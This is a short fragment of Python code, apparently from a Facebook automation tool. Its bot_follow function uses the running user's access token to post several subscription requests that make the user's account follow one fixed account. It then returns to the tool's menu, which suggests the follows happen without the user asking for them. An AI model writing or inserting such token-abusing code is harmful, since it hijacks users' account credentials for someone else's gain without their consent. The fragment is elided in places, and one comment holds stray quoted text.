...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Aditya Gremory 2006:")
	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Dapunta Ratya
	...
	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) #Bayu Putra Tama
	requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) #Zacky
	menu()
